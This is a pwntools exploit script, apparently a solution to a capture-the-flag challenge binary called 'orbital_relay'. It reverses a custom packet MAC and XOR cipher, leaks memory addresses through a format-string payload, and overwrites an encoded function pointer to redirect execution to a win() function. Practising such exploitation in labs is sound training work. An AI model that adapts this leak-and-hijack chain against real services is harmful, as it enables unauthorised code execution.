from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./orbital_relay')
sess_id = 0

def rol32(val, shift):
    return ((val << shift) | (val >> (32 - shift))) & 0xFFFFFFFF

def mix32(a1):
    a1 &= 0xFFFFFFFF
    a1 ^= (a1 << 13) & 0xFFFFFFFF
    a1 ^= (a1 >> 17) & 0xFFFFFFFF
    a1 ^= (a1 << 5)  & 0xFFFFFFFF
    return a1

def kbyte(a1, a2):
    val = (a1 + 73244475 * (a2 & 0xFFFF)) & 0xFFFFFFFF
    return mix32(val) & 0xFF

def encrypt_type16(data):
    qword_40E4_lower = 673332004
    dword_40E0_const = mix32(991242259)
    v10 = qword_40E4_lower ^ dword_40E0_const

    encrypted = bytearray()
    for i, b in enumerate(data):
        key = kbyte(v10, i)
        encrypted.append(b ^ key)
    return bytes(encrypted)

def calc_mac32(payload, cmd, pad, sess):
    res = pad ^ sess ^ (cmd << 16) ^ 0x9E3779B9
    res &= 0xFFFFFFFF
    for b in payload:
        res = ((b + 61) & 0xFFFFFFFF) ^ rol32(res, 7)
    return res

def send_packet(cmd, pad, payload):
    mac = calc_mac32(payload, cmd, pad, sess_id)
    size = len(payload)
    header = struct.pack('<BBHL', cmd, pad, size, mac)
    p.send(header + payload)

def make_tlv(typ, val):
    return struct.pack('<BB', typ, len(val)) + val

# 1. Handshake
magic_string = struct.pack('<L', 1129208147) + struct.pack('<L', 1060337219)[1:4]
p.send(magic_string)

sess_id = u32(p.recvn(4))
log.success(f"Session id : {hex(sess_id)}")

# 2. Authentication
cmd3_payload = struct.pack('<I', mix32(sess_id ^ 673332004) ^ 0x31C3B7A9)
send_packet(cmd=3, pad=0, payload=cmd3_payload)

# 3. Leak info via FSB
tlv_34 = make_tlv(34, b'\x03')
fsb_payload = b"%p %p %p\x00"
tlv_16 = make_tlv(16, encrypt_type16(fsb_payload))
tlv_64 = make_tlv(64, b'\x00')

leak_payload = tlv_34 + tlv_16 + tlv_64
send_packet(cmd=1, pad=0, payload=leak_payload)

p.recvuntil(b'0x')
dword_40E0 = int(p.recvuntil(b' ', drop=True), 16)

p.recvuntil(b'0x')
st_addr = int(p.recvuntil(b' ', drop=True), 16)

p.recvuntil(b'0x')
win_addr = int(p.recvuntil(b'\n', drop=True), 16)

log.success(f"Leaked dword_40E0: {hex(dword_40E0)}")
log.success(f"Leaked st_addr:    {hex(st_addr)}")

log.success(f"win() target: {hex(win_addr)}")

# 4. Overwrite function pointer
magic_const = 0x9E3779B97F4A7C15
qword_40E4_lower = 673332004

encoded_win = qword_40E4_lower ^ win_addr ^ (dword_40E0 << 32) ^ magic_const

tlv_49 = make_tlv(49, struct.pack('<Q', encoded_win))
exploit_payload = tlv_34 + tlv_49
send_packet(cmd=1, pad=0, payload=exploit_payload)

# 5. Trigger RCE
send_packet(cmd=9, pad=0, payload=b'')
print(p.recvall(timeout=2).decode('utf-8', errors='ignore'))